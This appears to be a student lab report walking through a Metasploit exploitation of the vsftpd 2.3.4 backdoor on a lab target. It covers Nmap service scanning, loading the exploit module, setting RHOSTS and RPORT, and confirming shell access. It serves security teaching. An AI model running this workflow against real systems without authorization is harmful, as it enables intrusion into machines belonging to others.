# Experiment 2: Simulating Vulnerability Exploitation using Metasploit Framework

## Objective

To identify running services and open ports on a target machine using Nmap, locate the corresponding exploit modules in Metasploit, configure the remote parameters, and simulate a controlled ethical exploit to gain terminal access.

## Procedure

### Step 1: Identify the attacker machine IP and verify connectivity

Open a terminal on the Kali Linux virtual machine and note the machine's IP address. Then verify that the attacker machine can reach the target machine on the same subnet.

# Commands used:
```bash
ifconfig
ping <target-ip>
```

![Step 1 Screenshot](Screenshots/Step_1.png)

### Step 2: Discover the target's open ports and service versions

Run an Nmap service detection scan against the target IP address to identify active ports and the exact versions of the running services.

# Commands used:
```bash
nmap -sV <target-ip>
```

![Step 2 Screenshot](Screenshots/Step_2.png)

### Step 3: Launch the Metasploit Framework

Open the Metasploit console from the Kali terminal to begin the exploitation workflow.

# Commands used:
```bash
msfconsole
```

![Step 3 Screenshot](Screenshots/Step_3.png)

### Step 4: Search for a matching exploit module

Use the service version identified by Nmap, such as VSFTPd 2.3.4, to search the Metasploit database for a relevant exploit module.

# Commands used:
```bash
search <service-name>
```

Example:
```bash
search vsftpd
```

![Step 4 Screenshot](Screenshots/Step_4.png)

### Step 5: Select and load the exploit module

Choose the exploit module that matches the target service and load it into the Metasploit session.

# Commands used:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Step 6: Check required module parameters

Review the required options for the selected exploit to determine which settings must be configured before execution.

# Commands used:
```bash
show options
```

### Step 7: Configure the remote target settings

Set the target host and port so the exploit knows where to send its payload.

# Commands used:
```bash
set RHOSTS <target-ip>
set RPORT 21
```

### Step 8: Launch the exploit simulation

Execute the selected exploit to simulate a controlled attack and establish a command session with the vulnerable target system.

# Commands used:
```bash
exploit
```

![Step 5 Screenshot](Screenshots/Step_5.png)

### Step 9: Verify successful remote access

Once the shell is opened, run basic Linux system commands to confirm access to the target machine.

# Commands used:
```bash
whoami
id
uname -a
```

## Result

The experiment was successfully completed in a controlled lab environment. Nmap was used to detect the target's open ports and running services, Metasploit was used to identify and load the matching exploit module, and the exploit was executed to establish a remote shell. The final verification commands confirmed successful access to the target system, demonstrating the practical process of vulnerability exploitation in an ethical and authorized setting.

## Conclusion

This experiment helped understand how attackers identify vulnerable services, select appropriate Metasploit modules, and exploit system weaknesses in a simulated environment. It also highlighted the importance of patching vulnerable services, restricting exposure, and using ethical hacking practices in cybersecurity labs.
